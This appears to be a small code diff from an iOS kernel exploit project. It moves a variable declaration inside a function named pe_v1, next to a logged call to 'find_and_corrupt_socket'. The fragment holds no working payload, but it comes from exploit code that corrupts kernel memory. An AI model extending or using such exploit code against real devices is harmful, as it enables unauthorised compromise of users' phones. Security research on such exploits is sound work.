@@ -46,6 +46,8 @@ kern_return_t pe_init(void) {
 }
 
 kern_return_t pe_v1(void) {
+    mach_vm_address_t success_mapping_address = 0;
+
     // 0x1000 pages
     uint64_t n_of_total_search_mapping_pages = 0x1000 * 0x10;
     // if (g_ctx.is_a18_devices) {
@@ -195,7 +197,6 @@ kern_return_t pe_v1(void) {
                     );
 
                     LOG("[ClearSword] AFTER find_and_corrupt_socket: %d", find_kr);
-                    mach_vm_address_t success_mapping_address = 0;
 
                     // inside the search loop, right after success = true:
                     if (find_kr == KERN_SUCCESS) {
